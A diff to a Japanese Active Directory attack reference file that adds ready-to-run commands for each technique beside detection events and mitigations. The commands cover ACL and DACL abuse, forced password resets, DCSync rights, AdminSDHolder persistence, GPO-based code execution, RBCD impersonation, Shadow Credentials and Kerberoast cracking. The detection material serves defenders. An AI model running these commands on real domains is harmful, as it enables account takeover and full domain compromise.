+        "q": "dacledit.py -action write -rights FullControl -principal svc_user -target victim_user corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "LDAP経由でGenericAll ACEを自アカウントへ付与。プロセスログを残さずDC側5136のみに残る",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' add genericAll victim_computer$ svc_user"
+      }
+    ],
     "detect": "Security 4662 (An operation was performed on an object) でGuid付き権限行使を監視。ACL変更は4670、グループ変更は4728/4732/4756、パスワード強制変更は4724を相関分析する。BloodHound的な広範なGenericAll付与自体を定期棚卸しで検知。",
     "events": "4662, 4670, 4724, 4728/4732/4756, 5136",
     "mitigate": "不要なGenericAll ACEを削除し最小権限化。Tier0オブジェクトへのACEを監査・SACLで4662を有効化。AdminSDHolder配下の保護アカウントは継承を切りACLをリセットする。",
@@ -2642,6 +4392,33 @@ AD.I18N.ja.attacks = [
     "summary": "対象の（ほぼ）全属性を書き込める権限。SPN/msDS-KeyCredentialLink/scriptPath等の書換で乗っ取りへ。",
     "how": "ユーザー対象ならservicePrincipalName書込でTargeted Kerberoasting、msDS-KeyCredentialLink書込でShadow Credentials、scriptPath/logon script書換でコード実行に持ち込む。コンピュータ対象ならmsDS-AllowedToActOnBehalfOfOtherIdentity書込でRBCD。グループのmemberは通常GenericWriteに含まれAddMember可能。",
     "tools": "PowerView (Set-DomainObject), Rubeus, Whisker/pyWhisker, targetedKerberoast.py, impacket (rbcd.py, addspn.py)",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "SPN書込みでTargeted Kerberoastの起点を作る。`Set-DomainObject -Set`実行が4104に残る",
+        "q": "Set-DomainObject -Identity victim_user -Set @{serviceprincipalname='fake/DoesNotExist1'}"
+      },
+      {
+        "tool": "Whisker",
+        "t": "msDS-KeyCredentialLinkを書換えShadow Credentialsへ。GenericWriteだけで鍵ベース認証を奪取できる",
+        "q": "Whisker.exe add /target:victim_user"
+      },
+      {
+        "tool": "Impacket",
+        "t": "computerのGenericWriteでRBCD属性を書換え。DCにプロセスログは残らずLDAP書込のみが痕跡",
+        "q": "rbcd.py -action write -delegate-to 'targetsrv$' -delegate-from 'evilpc$' -dc-ip 10.0.0.10 corp.local/svc_user:'Passw0rd!'"
+      },
+      {
+        "tool": "PowerView",
+        "t": "logon scriptパスを書換え次回ログオン時にコード実行。scriptPath属性へのLDAP書込みが唯一の痕跡",
+        "q": "Set-DomainObject -Identity victim_user -Set @{scriptPath='\\\\10.0.0.5\\share\\payload.bat'}"
+      },
+      {
+        "tool": "Impacket",
+        "t": "SPN書込みからTGS要求まで一括実行。`-request-user`とservicePrincipalName属性へのLDAP書込みが痕跡",
+        "q": "GetUserSPNs.py corp.local/svc_user:'Passw0rd!' -request-user victim_user -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "4662で対象GUID(msDS-KeyCredentialLink=5b47d60f..., servicePrincipalName等)への書込を監視。5136(ディレクトリオブジェクト変更)でSPNやmsDS-KeyCredentialLink属性の変更を捕捉。異常なSPN追加や後続のKerberos 4769を相関する。",
     "events": "4662, 5136, 4769, 4738",
     "mitigate": "GenericWrite ACEを棚卸し削除。msDS-KeyCredentialLink変更のSACL監査を有効化しShadow Credential検知。SPN追加を制限、機微アカウントは保護グループに入れAdminSDHolderで継承遮断。",
@@ -2682,6 +4459,28 @@ AD.I18N.ja.attacks = [
     "summary": "対象のDACLを書き換える権限。自分に任意ACE(GenericAll等)を付与して他攻撃へ昇格。",
     "how": "WriteDaclで対象オブジェクトのDACLに自分向けGenericAllやDCSync用の複製権限ACEを追記する。ドメインルートに対して行えばDS-Replication-Get-Changes/-Allを付与しDCSyncが可能。`dacledit.py`やPowerView `Add-DomainObjectAcl`で操作する。",
     "tools": "PowerView (Add-DomainObjectAcl), impacket dacledit.py, BloodHound, ntlmrelayx.py (-–escalate-user)",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "WriteDaclで自分にFullControl ACEを追加し以後の全攻撃へ昇格。`-Rights All`が定番",
+        "q": "Add-DomainObjectAcl -TargetIdentity victim_user -PrincipalIdentity svc_user -Rights All"
+      },
+      {
+        "tool": "Impacket",
+        "t": "同じ操作をLinux側から。DCにプロセスログは残らずLDAPのACE追記と5136監査だけが証拠",
+        "q": "dacledit.py -action write -rights FullControl -principal svc_user -target victim_user corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "dsacls.exe",
+        "t": "OS標準LOLBinでのDACL書換え。`/G`と`GA`(GenericAll)の組合せがコマンドライン検知の軸",
+        "q": "dsacls.exe \"CN=victim_user,CN=Users,DC=corp,DC=local\" /G \"CORP\\svc_user:GA\""
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "WriteDaclを使いLDAP経由でGenericAllを自付与。エンドポイント検知を回避し5136のみに残る",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' add genericAll victim_user svc_user"
+      }
+    ],
     "detect": "5136でnTSecurityDescriptor属性の変更を監視、特にドメインオブジェクトやAdminSDHolderへのDACL追記。4662で書込アクセスを確認。付与された複製権限による後続DCSync(4662 GUID 1131f6aa/1131f6ad)を相関する。",
     "events": "5136, 4662, 4670",
     "mitigate": "WriteDacl ACEを削除し所有者・ACLを定期棚卸し。ドメインオブジェクト/AdminSDHolderのSACL監査を有効化。重要オブジェクトのACL変更にアラートを設定する。",
@@ -2722,6 +4521,28 @@ AD.I18N.ja.attacks = [
     "summary": "対象の所有者を自分に変更。所有者はDACLを暗黙的に書換できるためWriteDacl相当に昇格。",
     "how": "WriteOwnerで対象オブジェクトのownerを自分(または制御アカウント)に変更し、所有者権限でWriteDaclを行いGenericAllを自付与する。以降はGenericAll系の全攻撃へ分岐。`owneredit.py`→`dacledit.py`の順で操作する。",
     "tools": "PowerView (Set-DomainObjectOwner), impacket owneredit.py/dacledit.py, BloodHound (Owns/WriteOwnerエッジ)",
+    "cmd": [
+      {
+        "tool": "Impacket",
+        "t": "所有者を自分へ変更しWriteDacl相当の足掛かりに。`-action write -new-owner`がowneredit.pyの決め手",
+        "q": "owneredit.py -action write -new-owner svc_user -target victim_user corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "PowerView",
+        "t": "同操作をPowerShell内で完結。`Set-DomainObjectOwner`実行はnTSecurityDescriptorのOwner SID変更で残る",
+        "q": "Set-DomainObjectOwner -Identity victim_user -OwnerIdentity svc_user"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "LDAP経由での所有者奪取。`set owner`後は所有者権限で任意ACEを追記できる",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' set owner victim_user svc_user"
+      },
+      {
+        "tool": "Impacket",
+        "t": "所有者奪取直後の定石。自分をFullControlにするDACL書込みが二段階目の痕跡として続く",
+        "q": "dacledit.py -action write -rights FullControl -principal svc_user -target victim_user corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10"
+      }
+    ],
     "detect": "5136でnTSecurityDescriptor(owner)変更を監視、4662でWRITE_OWNERアクセスを検知。所有者が既定(Domain Admins/Enterprise Admins)から個人アカウントへ変わる異常を検出する。",
     "events": "5136, 4662",
     "mitigate": "重要オブジェクトの所有者を管理グループに統一し監査。WriteOwner ACEを削除。所有者変更をSIEMでアラート化し、AdminSDHolderで保護アカウントのACLを定期是正する。",
@@ -2757,6 +4578,28 @@ AD.I18N.ja.attacks = [
     "summary": "グループのmember属性を書き込み、特権グループ(Domain Admins等)に任意アカウントを追加。",
     "how": "GenericAll/GenericWrite/WriteProperty(member)を持つグループへ制御アカウントを追加し権限を継承する。Domain Admins等Tier0グループなら即ドメイン掌握。`Add-DomainGroupMember`やnet/PowerShell、`net rpc group addmem`で追加、使用後に削除して痕跡消去することも。",
     "tools": "PowerView (Add-DomainGroupMember), net.exe, Active Directory PowerShellモジュール, BloodHound (AddMemberエッジ)",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "GenericAll/GenericWriteで特権グループへ直接追加。`Add-DomainGroupMember`実行は4104に残る",
+        "q": "Add-DomainGroupMember -Identity 'Domain Admins' -Members svc_user"
+      },
+      {
+        "tool": "net.exe",
+        "t": "OS標準LOLBinでのグループ追加。`net group ... /add /domain`は4728/4732を伴う定番文字列",
+        "q": "net group \"Domain Admins\" svc_user /add /domain"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "LDAP経由でmember属性へ直接書込み。エンドポイントに痕跡が残らずDC側4728系イベントのみで検知する",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' add groupMember 'Domain Admins' svc_user"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "署名済みRSATモジュールでの追加。正規運用と区別しづらいため追加先が特権グループかどうかで判定する",
+        "q": "Add-ADGroupMember -Identity 'Domain Admins' -Members svc_user"
+      }
+    ],
     "detect": "4728(グローバル)/4732(ローカル)/4756(ユニバーサル)のメンバー追加イベントを特権グループで監視。5136でmember属性変更を捕捉。短時間での追加→削除パターンやTier0グループへの想定外追加をアラート。",
     "events": "4728, 4732, 4756, 5136",
     "mitigate": "特権グループのACLを最小化しmember書込権を制限。保護グループ変更をリアルタイム通知。空にできる特権グループはJIT/PIM運用にし常設メンバーを排除する。",
@@ -2797,6 +4640,23 @@ AD.I18N.ja.attacks = [
     "summary": "対象ユーザーの現在パスワードを知らずに新パスワードを設定できる拡張権限。アカウント乗っ取り。",
     "how": "User-Force-Change-Password拡張権限(またはGenericAll)を持つユーザーに対し新パスワードを強制設定しログオンする。`Set-DomainUserPassword`やimpacket `changepasswd.py`/`net rpc password`を使用。標的が使用中だと業務影響で気付かれやすいため注意する。",
     "tools": "PowerView (Set-DomainUserPassword), impacket (net.py, changepasswd.py, smbpasswd), Rubeus (後続)",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "現パスワードを知らずに新パスワードを強制設定。`Set-DomainUserPassword`実行後は4724(パスワードリセット)が残る",
+        "q": "Set-DomainUserPassword -Identity victim_user -AccountPassword (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)"
+      },
+      {
+        "tool": "Impacket",
+        "t": "SAMR経由のリモートパスワード変更。`-altuser`/`-altpass`が制御アカウント側、対象は`-newpass`で指定",
+        "q": "changepasswd.py corp.local/victim_user@10.0.0.10 -newpass 'Passw0rd!' -altuser svc_user -altpass 'Passw0rd!2'"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "LDAP経由でのパスワード変更。エンドポイントに痕跡が残らずDC側4724とLDAP接続元IPで見る",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' set password victim_user 'NewPassw0rd!'"
+      }
+    ],
     "detect": "4724(パスワードリセット試行)を、実行者と対象が通常の管理関係にないケースで監視。4738(アカウント変更)やpwdLastSet変化を相関。ヘルプデスク外からのリセットをアラート化する。",
     "events": "4724, 4738",
     "mitigate": "User-Force-Change-Password ACEを棚卸しし委任を最小化。機微アカウントは保護グループへ。異常なリセットを検知しMFA/パスワードレスで単独リセットの影響を低減する。",
@@ -2832,6 +4692,28 @@ AD.I18N.ja.attacks = [
     "summary": "自分自身をグループに追加できるSelf権限。委任された自己参加設定の悪用。",
     "how": "グループのSelf-Membership書込ACEを持つ主体が自分をそのグループへ追加し権限を得る。BloodHoundのAddSelfエッジとして表示。`Add-DomainGroupMember -Identity <grp> -Members <self>`で実行する。",
     "tools": "PowerView (Add-DomainGroupMember), net.exe, BloodHound (AddSelfエッジ)",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "Self ACEで自分自身をグループへ追加。`Add-DomainGroupMember`で対象と実行者が同一な点がAddMemberとの識別点",
+        "q": "Add-DomainGroupMember -Identity 'VPN Access' -Members svc_user"
+      },
+      {
+        "tool": "net.exe",
+        "t": "OS標準LOLBinでの自己追加。実行アカウントと追加対象が同一sAMAccountNameになる4728が特徴",
+        "q": "net group \"VPN Access\" svc_user /add /domain"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "LDAP経由での自己参加。プロセスログを残さずDC側4728と実行アカウント=追加対象の一致で判定",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' add groupMember 'VPN Access' svc_user"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "署名済みRSATモジュールでの自己追加。4104に`Add-ADGroupMember`と自アカウント名が並んで残る",
+        "q": "Add-ADGroupMember -Identity 'VPN Access' -Members svc_user"
+      }
+    ],
     "detect": "4728/4732/4756で追加された主体と対象が同一であるケースを監視。5136でmember属性の自己追加を検知する。",
     "events": "4728, 4732, 4756, 5136",
     "mitigate": "Self-Membership ACEを必要最小に限定し特権グループには付与しない。定期的にグループACLを棚卸しする。",
@@ -2867,6 +4749,28 @@ AD.I18N.ja.attacks = [
     "summary": "ドメインオブジェクトにレプリケーション権限ACEを付与し、任意アカウントでDCSyncを可能にする。",
     "how": "WriteDacl/GenericAllをドメインルートに持つ主体が、制御アカウントへDS-Replication-Get-Changes(GUID 1131f6aa)とGet-Changes-All(1131f6ad)を付与する。以降そのアカウントで全ユーザーのNTLMハッシュ/krbtgtを複製抽出する。ntlmrelayx `--escalate-user`やdacledit.pyで自動付与も可能。",
     "tools": "PowerView (Add-DomainObjectAcl -Rights DCSync), impacket (dacledit.py, secretsdump.py), ntlmrelayx.py, mimikatz (lsadump::dcsync)",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "ドメインルートにレプリケーション権限ACEを付与。`-Rights DCSync`一発でGUID 1131f6aa/1131f6adを追記",
+        "q": "Add-DomainObjectAcl -TargetIdentity \"DC=corp,DC=local\" -PrincipalIdentity svc_user -Rights DCSync"
+      },
+      {
+        "tool": "Impacket",
+        "t": "同じACEをLinux側から追記。`-rights DCSync -target-dn`でドメインオブジェクトを直接指定",
+        "q": "dacledit.py -action write -rights DCSync -principal svc_user -target-dn \"DC=corp,DC=local\" corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "ntlmrelayx",
+        "t": "LDAP認証をリレーし自動でDCSync ACEを追加。`--escalate-user`実行元IPがDC以外なら黒",
+        "q": "ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user svc_user"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "LDAP経由での一括付与。`add dcsync`は内部でGet-Changes/Get-Changes-All両GUIDを書込む",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' add dcsync svc_user"
+      }
+    ],
     "detect": "5136でドメインオブジェクトのDACLに複製関連GUIDが追加された変更を監視。DC以外の主体からの4662(GUID 1131f6aa/1131f6ad)によるレプリケーションをアラート化する。",
     "events": "5136, 4662",
     "mitigate": "レプリケーション権限をDC/正規サービスのみに限定し定期棚卸し。ドメインオブジェクトのSACL監査を有効化。非DCからのDRSUAPI複製をネットワーク/SIEMで検知する。",
@@ -2912,6 +4816,28 @@ AD.I18N.ja.attacks = [
     "summary": "AdminSDHolderのACLに自ACEを追加すると60分ごとのSDPropで全保護アカウントへ伝播し永続化する。",
     "how": "CN=AdminSDHolder,CN=System配下のnTSecurityDescriptorに制御アカウント向けGenericAll/ForceChangePassword ACEを追記する。SDProp(既定60分)がDomain Admins等の保護オブジェクトへ自動伝播し、削除しても再付与される永続バックドアとなる。",
     "tools": "PowerView (Add-DomainObjectAcl), ADSIEdit, impacket dacledit.py",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "CN=AdminSDHolderのDACLに自ACEを追記。SDProp(既定60分)でDomain Admins等へ自動伝播し削除しても復活する",
+        "q": "Add-DomainObjectAcl -TargetIdentity \"CN=AdminSDHolder,CN=System,DC=corp,DC=local\" -PrincipalIdentity svc_user -Rights All"
+      },
+      {
+        "tool": "Impacket",
+        "t": "同操作をLinux側から。AdminSDHolderコンテナへの書込みはDC側5136で通常ほぼ発生しない希少イベント",
+        "q": "dacledit.py -action write -rights FullControl -principal svc_user -target-dn \"CN=AdminSDHolder,CN=System,DC=corp,DC=local\" corp.local/svc_user:'Passw0rd!' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "ADSIEdit",
+        "t": "GUI操作のためコマンドライン痕跡はほぼ皆無。残るのはmmc.exeの起動とDC側5136(nTSecurityDescriptor変更)のみ",
+        "q": "mmc.exe C:\\Windows\\System32\\adsiedit.msc"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "LDAP経由でAdminSDHolderへGenericAllを自付与。エンドポイント痕跡が無く対象DNがAdminSDHolderである点が唯一の特徴",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' add genericAll 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' svc_user"
+      }
+    ],
     "detect": "5136でAdminSDHolderオブジェクトのnTSecurityDescriptor変更を最優先監視。保護アカウントに想定外ACEが出現(adminCount=1オブジェクトのACL異常)を定期スキャン。4780(SDProp適用)を相関する。",
     "events": "5136, 4780, 4662",
     "mitigate": "AdminSDHolderへの書込を厳格に制限しSACL監査。ベースラインACLと定期比較し逸脱を是正。dsHeuristicsやadminCountオブジェクトのACLを継続監査する。",
@@ -2947,6 +4873,28 @@ AD.I18N.ja.attacks = [
     "summary": "GPOオブジェクトへの書込権限で、リンク先OU/ドメインの全端末に即席タスクやスクリプトを配布しコード実行。",
     "how": "GPOに対しWriteProperty/GenericWrite/WriteDaclを持つ主体が、GPTのSYSVOLファイル(scheduledtasks.xml等)や属性を書き換え即時スケジュールタスク・スタートアップスクリプト・ローカル管理者追加を仕込む。リンクされたOU配下の全コンピュータ/ユーザーで実行される。",
     "tools": "SharpGPOAbuse, pyGPOAbuse, PowerView (Get-DomainGPO/New-GPOImmediateTask), BloodHound (GenericWrite on GPO)",
+    "cmd": [
+      {
+        "tool": "SharpGPOAbuse",
+        "t": "GPOへの即時スケジュールタスク仕込み。`--AddComputerTask`と`--GPOName`がコマンドライン検知の軸",
+        "q": "SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author CORP\\svc_user --Command \"cmd.exe\" --Arguments \"/c net localgroup administrators svc_user /add\" --GPOName \"Vulnerable GPO\""
+      },
+      {
+        "tool": "pyGPOAbuse",
+        "t": "Linux側からSYSVOL経由で同等の即時タスクを仕込む。`-gpo-id`のGUIDとSMB書込みが痕跡",
+        "q": "pygpoabuse.py corp.local/svc_user:'Passw0rd!' -gpo-id D9A65E7F-112D-49B9-AF7A-4FC2BA092BF6 -taskname Update -command \"net localgroup administrators svc_user /add\" -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "PowerView",
+        "t": "PowerShellのみで即時タスクGPOを作成。`New-GPOImmediateTask`実行が4104のスクリプトブロックに残る",
+        "q": "New-GPOImmediateTask -Force -TaskName 'Update' -GPODisplayName 'Vulnerable GPO' -Command cmd -CommandArguments \"/c net localgroup administrators svc_user /add\""
+      },
+      {
+        "tool": "gpupdate.exe",
+        "t": "改ざん直後にOS標準コマンドで即時反映を強制。既定90分の更新周期を待たず被害端末で実行される",
+        "q": "gpupdate.exe /force"
+      }
+    ],
     "detect": "5136でGPCオブジェクト変更、SYSVOL上のGPT.ini/gPCMachineExtensionNames/Scheduled Tasksファイルの改ざんをFIMで検知。versionNumber急増や不審な即時タスク配布を監視。4698(タスク作成)を端末側で相関する。",
     "events": "5136, 4698, 5145(SYSVOL共有アクセス)",
     "mitigate": "GPOの委任を最小化しTier0のみ編集可に。SYSVOLのGPTファイルにFIM設定。重要OU(Domain Controllers含む)へのGPLink/GPO編集をアラート化する。",
@@ -2987,6 +4935,28 @@ AD.I18N.ja.attacks = [
     "summary": "OU/ドメインのgPLink属性書込権で、攻撃者制御のGPOを標的OUにリンクし配下端末を掌握。",
     "how": "OU/サイト/ドメインのgPLink属性への書込権を持つ主体が、自作または既存の悪性GPOを標的OUにリンクさせる。配下のコンピュータ/ユーザーにポリシーが適用されコード実行や権限昇格に至る。BloodHoundのGPLinkエッジで可視化。",
     "tools": "PowerView (Set-DomainObject gPLink), pyGPOAbuse, SharpGPOAbuse, BloodHound",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "OU/ドメインのgPLink属性へ悪性GPOのリンクを追記。`Set-DomainObject`のgplink値書換が唯一の痕跡",
+        "q": "Set-DomainObject -Identity \"OU=Workstations,DC=corp,DC=local\" -Set @{gplink='[LDAP://cn={D9A65E7F-112D-49B9-AF7A-4FC2BA092BF6},cn=policies,cn=system,DC=corp,DC=local];0'}"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "LDAP経由でgPLink属性を直接上書き。エンドポイントに痕跡が残らずDC側の属性値変化でのみ検知できる",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' set object \"OU=Workstations,DC=corp,DC=local\" gPLink -v \"[LDAP://cn={D9A65E7F-112D-49B9-AF7A-4FC2BA092BF6},cn=policies,cn=system,DC=corp,DC=local];0\""
+      },
+      {
+        "tool": "ldapmodify",
+        "t": "OpenLDAPクライアントでの生LDAP書込み。LinuxからのSimple Bind+changetype:modifyがDCの5136に残る",
+        "q": "ldapmodify -x -D 'svc_user@corp.local' -w 'Passw0rd!' -H ldap://10.0.0.10 -f gplink_modify.ldif"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "署名済みGroupPolicyモジュールでのリンク追加。`New-GPLink`は4104に残るが正規運用のGPO管理と紛らわしい",
+        "q": "New-GPLink -Name 'Evil Policy' -Target \"OU=Workstations,DC=corp,DC=local\""
+      }
+    ],
     "detect": "5136でOU/ドメインオブジェクトのgPLink属性変更を監視。想定外GPOのリンク追加、特にDomain Controllers OUへのリンク変更を最優先アラート化する。",
     "events": "5136",
     "mitigate": "OUのgPLink書込委任を最小化。重要OUへのリンク変更をリアルタイム検知。GPOリンク構成をベースライン管理し逸脱を是正する。",
@@ -3017,6 +4987,33 @@ AD.I18N.ja.attacks = [
     "summary": "標的コンピュータのmsDS-AllowedToActOnBehalfOf属性を書き、攻撃者制御アカウントからS4U2Selfで任意ユーザーになりすます。",
     "how": "標的コンピュータへGenericWrite/GenericAll/WriteProperty(またはWriteAccountRestrictions)を持つ主体が、自分の制御するマシンアカウント(なければMachineAccountQuota既定10で新規作成)のSIDをmsDS-AllowedToActOnBehalfOfOtherIdentityに書き込む。次にS4U2Self+S4U2ProxyでAdministratorとして標的のCIFS/HOST等サービスチケットを取得しローカル管理者権限を得る。",
     "tools": "PowerView (Set-DomainRBCD), impacket (rbcd.py, addcomputer.py, getST.py), Rubeus (s4u), StandIn",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "標的computerのRBCD属性を自制御アカウントSIDで書換え。`Set-DomainRBCD`実行が4104に残る",
+        "q": "Set-DomainRBCD -Identity targetsrv$ -DelegateFrom evilpc$ -Verbose"
+      },
+      {
+        "tool": "Impacket",
+        "t": "同操作をLinux側から。msDS-AllowedToActOnBehalfOfOtherIdentityへのLDAP書込みがDC側5136で見える",
+        "q": "rbcd.py -action write -delegate-to 'targetsrv$' -delegate-from 'evilpc$' -dc-ip 10.0.0.10 corp.local/svc_user:'Passw0rd!'"
+      },
+      {
+        "tool": "Impacket",
+        "t": "MachineAccountQuota(既定10)を使い自制御コンピュータを新規作成する前段。SAMR経由のコンピュータ追加が4741を発生させる",
+        "q": "addcomputer.py -computer-name 'EVILPC$' -computer-pass 'Passw0rd!' -dc-ip 10.0.0.10 corp.local/svc_user:'Passw0rd!'"
+      },
+      {
+        "tool": "Impacket",
+        "t": "RBCD設定後にS4U2Self+S4U2Proxyで任意ユーザーとしてサービスチケットを取得。`-impersonate`が特権昇格の決め手",
+        "q": "getST.py -spn cifs/targetsrv.corp.local -impersonate administrator -dc-ip 10.0.0.10 corp.local/evilpc$:'Passw0rd!'"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "LDAP経由でRBCDを設定。プロセスログを残さずDC側5136とmsDS-AllowedToActOnBehalfOf変化のみが痕跡",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' add rbcd targetsrv$ evilpc$"
+      }
+    ],
     "detect": "5136でmsDS-AllowedToActOnBehalfOfOtherIdentity(msDS-AllowedToActOnBehalfOfOtherIdentity)属性の変更を監視。4741(コンピュータアカウント作成)でMAQ悪用を検知。4769でS4U2Proxy(0x40810000系フラグ)やドメイン外主体のチケット要求を相関する。",
     "events": "5136, 4741, 4769, 4624",
     "mitigate": "ms-DS-MachineAccountQuotaを0にし一般ユーザーのマシン作成を禁止。コンピュータオブジェクトへの書込委任を最小化。msDS-AllowedToActOnBehalfOf属性変更をアラート化しTieringでコンピュータのGenericWriteを排除する。",
@@ -3057,6 +5054,33 @@ AD.I18N.ja.attacks = [
     "summary": "標的のmsDS-KeyCredentialLinkに攻撃者の証明書鍵を追加し、PKINITで標的として認証しNTLMハッシュも取得。",
     "how": "標的ユーザー/コンピュータにGenericWrite/GenericAll/AddKeyCredentialLink権を持つ主体が、自作の公開鍵をmsDS-KeyCredentialLink属性へ追加する。対応する秘密鍵でPKINIT(証明書ベースKerberos)認証を行いTGTを取得、UnPACの手法で標的のNTLMハッシュも入手する。パスワード変更不要でステルス性が高い。",
     "tools": "Whisker, pyWhisker, Certipy (shadow auto), Rubeus (asktgt /certificate), ntlmrelayx (--shadow-credentials)",
+    "cmd": [
+      {
+        "tool": "Whisker",
+        "t": "msDS-KeyCredentialLinkへ攻撃者鍵を追加。`add /target:`実行後にPKINIT認証でTGT取得へ進む",
+        "q": "Whisker.exe add /target:victim_user"
+      },
+      {
+        "tool": "pywhisker",
+        "t": "Linux側からの同等操作。`--action add`とPFX出力ファイル名がログから追える数少ない手掛かり",
+        "q": "python3 pywhisker.py -d corp.local -u svc_user -p 'Passw0rd!' --target victim_user --action add --filename cert1"
+      },
+      {
+        "tool": "Certipy",
+        "t": "鍵追加からPKINIT認証・UnPAC-the-Hashまで自動実行。`shadow auto`一発でNTLMハッシュまで奪取",
+        "q": "certipy shadow auto -account victim_user -u 'svc_user@corp.local' -p 'Passw0rd!' -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "生成済み証明書でPKINIT認証しTGT取得とNTLMハッシュ回収。`/certificate`と`/getcredentials`が組み合わせの目印",
+        "q": "Rubeus.exe asktgt /user:victim_user /certificate:cert1.pfx /password:'Passw0rd!' /domain:corp.local /dc:dc01.corp.local /getcredentials"
+      },
+      {
+        "tool": "bloodyAD",
+        "t": "LDAP経由でKey Credentialを追加。パスワード変更不要でエンドポイント痕跡が無くLDAP書込みのみが証拠",
+        "q": "bloodyAD -H 10.0.0.10 -d corp.local -u svc_user -p 'Passw0rd!' add shadowCredentials victim_user"
+      }
+    ],
     "detect": "5136でmsDS-KeyCredentialLink変更を監視するが、既定のDS変更監査はコンピュータオブジェクトは記録してもユーザーオブジェクトは記録しない。ユーザー標的を取りこぼさないため、対象コンテナ/OUに属性スキーマGUID 5b47d60f-6090-40b2-9f37-2a4de88f3063 のWrite監査SACLを明示設定する(未設定だとユーザー標的攻撃は5136が一切出ない)。ユーザーオブジェクトは4662(プロパティGUIDアクセス)で補完検知する。PKINIT時の4768(Certificate Information非空)を、WHfB/スマートカード未登録アカウントからのTGT要求と相関し、想定外主体によるKeyCredential追加→直後の証明書ログオンの連鎖を黒判定する。",
     "events": "5136(KeyCredentialLink変更/既定はコンピュータのみ), 4662(ユーザー標的の代替/属性GUIDアクセス), 4768(PKINIT証明書ログオン)",
     "mitigate": "msDS-KeyCredentialLink書込委任を排除しSACL監査を有効化。AD CS/Key Trustが不要なら鍵信頼を制限。BloodHound/PowerShellで既存KeyCredentialを棚卸しし不正エントリを削除する。",
@@ -3097,6 +5121,33 @@ AD.I18N.ja.attacks = [
     "summary": "標的ユーザーにSPNを一時付与しTGSを取得、オフラインでパスワードを解読。",
     "how": "標的ユーザーへGenericWrite/GenericAll/WriteProperty(servicePrincipalName)を持つ主体が任意SPNを付与し、そのユーザーのTGS-REPを要求してRC4暗号ハッシュを取得、Hashcatで平文パスワードを解読する。解読後SPNを削除し痕跡を消す。",
     "tools": "PowerView (Set-DomainObject servicePrincipalName), Rubeus (kerberoast), targetedKerberoast.py, impacket GetUserSPNs.py, Hashcat",
+    "cmd": [
+      {
+        "tool": "PowerView",
+        "t": "SPNを持たないユーザーへ一時的にSPNを書込みKerberoast可能化。書込み直後のTGS要求と相関させる",
+        "q": "Set-DomainObject -Identity victim_user -Set @{serviceprincipalname='fake/DoesNotExist1'}"
+      },
+      {
+        "tool": "Rubeus",
+        "t": "単一ユーザーを指名してTGS-REPを要求しハッシュ出力。`/user`指定が全件スキャンとの違い",
+        "q": "Rubeus.exe kerberoast /user:victim_user /nowrap"
+      },
+      {
+        "tool": "Impacket",
+        "t": "SPN書込みからTGS要求・削除まで一括実行。`--request-user`とservicePrincipalNameのLDAP書込みが痕跡",
+        "q": "targetedKerberoast.py -d corp.local -u svc_user -p 'Passw0rd!' --request-user victim_user --dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "Impacket",
+        "t": "同じ流れをGetUserSPNs.pyで実行。`-request-user`で対象を絞り込みTGS-REPをファイル出力",
+        "q": "GetUserSPNs.py corp.local/svc_user:'Passw0rd!' -request-user victim_user -dc-ip 10.0.0.10 -outputfile hashes.txt"
+      },
+      {
+        "tool": "Hashcat",
+        "t": "持ち出し後のオフライン解析。モード13100=RC4のTGS-REPで出現自体がTargeted Kerberoast成立の裏付け",
+        "q": "hashcat -m 13100 -a 0 hashes.txt rockyou.txt -r best64.rule"
+      }
+    ],
